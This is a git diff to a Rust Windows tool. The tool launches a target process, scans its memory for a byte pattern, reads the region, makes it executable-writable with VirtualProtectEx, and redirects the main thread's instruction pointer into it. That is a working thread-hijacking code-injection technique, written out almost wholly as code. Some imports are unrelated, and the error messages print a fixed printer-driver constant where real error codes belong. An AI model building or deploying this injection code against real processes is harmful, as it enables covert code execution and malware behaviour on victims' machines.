@@ -1,4 +1,5 @@
 use std::{
+    io::{self, BufRead},
     mem::zeroed,
     net::Shutdown::Write,
     os::raw::{c_uint, c_void},
@@ -6,7 +7,10 @@ use std::{
 };
 
 use windows_sys::{
-    Wdk::System::Threading::{NtQueryInformationThread, ThreadQuerySetWin32StartAddress},
+    Wdk::System::Threading::{
+        NtQueryInformationThread, ProcessWin32kSyscallFilterInformation,
+        ThreadQuerySetWin32StartAddress,
+    },
     Win32::{
         Foundation::{
             CloseHandle, ERROR_PRINTER_DRIVER_BLOCKED, HANDLE_FLAG_INHERIT, INVALID_HANDLE_VALUE,
@@ -17,8 +21,8 @@ use windows_sys::{
         System::{
             Diagnostics::{
                 Debug::{
-                    CONTEXT, CONTEXT_CONTROL_AMD64, GetThreadContext, ReadProcessMemory,
-                    SetThreadContext, WriteProcessMemory,
+                    CONTEXT, CONTEXT_CONTROL_AMD64, EX_PROP_INFO_LOCKBYTES, GetThreadContext,
+                    ReadProcessMemory, SetThreadContext, WriteProcessMemory,
                 },
                 ToolHelp::{
                     CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, TH32CS_SNAPMODULE,
@@ -29,7 +33,7 @@ use windows_sys::{
             Memory::{
                 MEM_COMMIT, MEM_PRIVATE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READ,
                 PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_GUARD, PAGE_NOACCESS,
-                PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, VirtualQueryEx,
+                PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, VirtualProtectEx, VirtualQueryEx,
             },
             Pipes::{CreatePipe, PeekNamedPipe},
             SystemInformation::{GetNativeSystemInfo, SYSTEM_INFO},
@@ -148,7 +152,7 @@ fn find_pattern(h_process: *mut c_void, pattern: &[u8]) -> usize {
         GetNativeSystemInfo(&mut sys_info);
 
         let mut address = sys_info.lpMinimumApplicationAddress as usize;
-        let mut max_address = sys_info.lpMaximumApplicationAddress as usize;
+        let max_address = sys_info.lpMaximumApplicationAddress as usize;
 
         let mut mbi = zeroed::<MEMORY_BASIC_INFORMATION>();
         let mut buffer: Vec<u8> = Vec::new();
@@ -160,7 +164,7 @@ fn find_pattern(h_process: *mut c_void, pattern: &[u8]) -> usize {
                 h_process,
                 address as *const c_void,
                 &mut mbi,
-                size_of::<MEMORY_BASIC_INFORMATION>() as usize,
+                size_of::<MEMORY_BASIC_INFORMATION>(),
             ) == 0
             {
                 address += sys_info.dwPageSize as usize;
@@ -168,7 +172,7 @@ fn find_pattern(h_process: *mut c_void, pattern: &[u8]) -> usize {
             }
 
             let is_private = mbi.Type == MEM_PRIVATE;
-            let is_commited = mbi.State == MEM_COMMIT;
+            let is_committed = mbi.State == MEM_COMMIT;
             let is_readable = mbi.Protect
                 & (PAGE_READONLY
                     | PAGE_READWRITE
@@ -177,19 +181,19 @@ fn find_pattern(h_process: *mut c_void, pattern: &[u8]) -> usize {
                     | PAGE_WRITECOPY
                     | PAGE_EXECUTE_WRITECOPY)
                 != 0;
-            let is_gaurded = mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS) != 0;
+            let is_guarded = mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS) != 0;
 
-            if is_private && is_commited && is_readable && !is_gaurded {
+            if is_private && is_committed && is_readable && !is_guarded {
                 let region_size = mbi.RegionSize;
 
                 if region_size >= pattern_size {
                     buffer.resize(region_size, 0);
-                    let mut bytes_read = 0;
+                    let mut bytes_read: usize = 0;
 
                     if ReadProcessMemory(
                         h_process,
-                        mbi.BaseAddress,
-                        buffer.as_mut() as *mut c_void,
+                        mbi.BaseAddress as *const c_void,
+                        buffer.as_mut_ptr() as *mut c_void,
                         region_size,
                         &mut bytes_read,
                     ) != 0
@@ -356,9 +360,9 @@ fn main() {
         return;
     }
 
-    let procName = &args[1];
+    let proc_name = &args[1];
 
-    println!("[+] Launching {}...", procName);
+    println!("[+] Launching {}...", proc_name);
     unsafe {
         let mut h_child_in_rd: *mut c_void = null_mut();
         let mut h_child_in_wr: *mut c_void = null_mut();
@@ -394,7 +398,7 @@ fn main() {
 
         if CreateProcessA(
             null_mut(),
-            procName.as_ptr() as *mut u8,
+            proc_name.as_ptr() as *mut u8,
             null_mut(),
             null_mut(),
             1,
@@ -421,7 +425,7 @@ fn main() {
         Sleep(2000);
 
         let output = read_from_pipe(h_child_out_rd);
-        println!("[+] Output from {}:\n{}", procName, output);
+        println!("[+] Output from {}:\n{}", proc_name, output);
 
         let raw_data: &[u8] = &[
             0x61, 0x61, 0x61, 0x62, 0x62, 0x62, 0x63, 0x63, 0x63, 0x64, 0x64, 0x64, 0x65, 0x65,
@@ -445,22 +449,94 @@ fn main() {
                 pi.hProcess,
                 result as *const c_void,
                 &mut mbi,
-                size_of::<MEMORY_BASIC_INFORMATION>() as usize,
+                size_of::<MEMORY_BASIC_INFORMATION>(),
+            ) != 0
+            {
+                println!(
+                    "[+] Region @ 0x{:X}: base=0x{:X} size=0x{:X} state=0x{:X} protect=0x{:X} type=0x{:X}",
+                    result,
+                    mbi.BaseAddress as usize,
+                    mbi.RegionSize,
+                    mbi.State,
+                    mbi.Protect,
+                    mbi.Type
+                );
+            } else {
+                println!(
+                    "[-] VirtualQueryEx failed (continuing anyway): {}",
+                    ERROR_PRINTER_DRIVER_BLOCKED
+                );
+            }
+
+            let mut buf: Vec<u8> = vec![0u8; size];
+            let mut got: usize = 0;
+            if ReadProcessMemory(
+                pi.hProcess,
+                result as *const c_void,
+                buf.as_mut_ptr() as *mut c_void,
+                size,
+                &mut got,
             ) == 0
             {
-                println!("[-] VirtualQueryEx failed.");
+                println!(
+                    "[-] ReadProcessMemory failed: {}",
+                    ERROR_PRINTER_DRIVER_BLOCKED
+                );
+                CloseHandle(pi.hProcess);
+                return;
+            }
+            println!("[+] Read {}/{} bytes from 0x{:X}\n", got, size, result);
+
+            let mut old_prot: u32 = 0;
+            if VirtualProtectEx(
+                pi.hProcess,
+                result as *mut c_void,
+                size,
+                new_protect,
+                &mut old_prot,
+            ) == 0
+            {
+                println!(
+                    "[-] VirtualProtectEx failed: {}",
+                    ERROR_PRINTER_DRIVER_BLOCKED
+                );
+                CloseHandle(pi.hProcess);
+                return;
+            }
+            println!(
+                "[+] VirtualProtectEx OK: 0x{:X} size={} old=0x{:X} new=0x{:X}\n",
+                result, size, old_prot, new_protect
+            );
+
+            let main_tid = get_main_thread_id(pi.dwProcessId);
+            if main_tid == 0 {
+                println!("[!] Could not find main thread for PID {}", pi.dwProcessId);
+                CloseHandle(pi.hProcess);
+                return;
+            }
+            println!("[+] Main thread TID = {}", main_tid);
+
+            let target_rip = result as u64 + 0x19;
+            if !hijack_thread_rip(main_tid, target_rip, true) {
+                println!("[!] Failed to hijack thread {}", main_tid);
+                CloseHandle(pi.hProcess);
                 return;
             }
 
             println!(
-                "[+] Region @ {:p}: base=0x{:X}, state=0x{:X}, size=0x{:X}, protect=0x{:X}, type=0x{:X}",
-                mbi.BaseAddress,
-                mbi.BaseAddress as usize,
-                mbi.State,
-                mbi.RegionSize,
-                mbi.Protect,
-                mbi.Type
+                "\n[+] Done. Main thread now executing at 0x{:X}",
+                target_rip
             );
+        } else {
+            println!("Pattern not found.");
         }
+
+        println!("\n[+] Press Enter to exit...");
+        let _ = io::stdin().lock().read_line(&mut String::new());
+
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        CloseHandle(h_child_out_rd);
+        CloseHandle(h_child_in_wr);
     }
 }
